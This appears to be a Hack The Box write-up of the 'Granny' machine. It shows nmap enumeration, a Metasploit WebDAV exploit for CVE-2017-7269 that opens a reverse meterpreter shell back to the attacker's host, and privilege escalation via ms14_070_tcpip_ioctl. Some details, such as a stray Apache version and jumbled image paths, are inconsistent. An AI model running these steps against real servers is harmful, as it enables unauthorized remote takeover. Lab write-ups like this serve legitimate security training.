![logo](/logo.png)

# [Granny- BOX]  
Hi folks, today I am going to solve an Easy rated hack the box machine which was released on 12 Apr 2017 as the twelfth machine on HTB,Granny created by ch4p.So without any further intro, let'sf jump in.

# common enumeration

## Nmap
  *http
  *Microsoft-IIS/6.0
  
###### code-nmap

```code
nmap -sV -sC -oA nmap/granny 10.10.10.15
```

###### Output 

![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Granny/Screenshots/nmap.png)

```sh
nmap -sV -sC -oA nmap/granny 10.10.10.15                                                                                          ─╯
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-13 18:34 EAT
Nmap scan report for 10.10.10.15
Host is up (0.33s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   WebDAV type: Unknown
|   Server Date: Tue, 13 Aug 2024 15:35:35 GMT
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_  Server Type: Microsoft-IIS/6.0
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.69 seconds
```

looking at the results  we find out that there is 1 ports open and its a `Windows`and its running an `Microsoft IIS httpd 6.0`. 

port[80]-  httpd 2.4.18

when we naviagate to [http://10.10.10.15](http://10.10.10.15) we find a page that say it under construction 

 ![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Granny/Screenshots/granny.png)

so we know the machine version so what we are going to do is to search for the exploit 

```sh
searchsploit Microsoft IIS 6.0 
```

![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Granny/Screenshots/searchsploit.png)

Some searching reveals a remote code execution vulnerability (CVE-2017-7269). There is a proof of concept that requires some modification, as well as a Metasploit module. Lets examine the Remote Buffer Overflow.After Examining the exploit we now Import it to our working directory.

# Exploitation

Executing the Metasploit module `windows/iis/iis_webdav_scstoragepathfromurl` immediately grants a shell.

```sh
use windows/iis/iis_webdav_scstoragepathfromurl
set RHOSTS 10.10.10.15
set RPORT 80
set LHOST 10.10.14.15
run
```

![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Granny/Screenshots/meterpreter.png)

looking at `sysinfo` it refuse because of access probably we are in the 32-bit meterpreter that does not have privillages .We noticed that it running a 32 bit meterpreter so lets migrate to a 32 bit meterpreter with `NT Authority` and be able to run a `local suggester`

After migrating we can now be able to run `sysinfo`

![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Granny/Screenshots/sy64.png)

now i run suggester to find exploits which are vulnerable

# Privillage Exploitation

```sh
search local_exploit_suggester
use multi/recon/local_exploit_suggester
```

![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Granny/Screenshots/eploits.png)

looking at the results we find that their are a couple of exploits. In this case lets try this exploit `exploit/windows/local/ms14_070_tcpip_ioctl`

```sh
use exploit/windows/local/ms14_070_tcpip_ioctl
```

![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Granny/Screenshots/msf.png)

and just that way we get shell

![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Granny/Screenshots/shell.png)

we can get the user flag from `C:\Documents and Settings\Lakis\Desktop`  and the root flag from `C:\Documents and Settings\Administrator\Desktop\root.txt`

![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Granny/Screenshots/root.png)

	-------------------------END successful attack @lesley----------------------
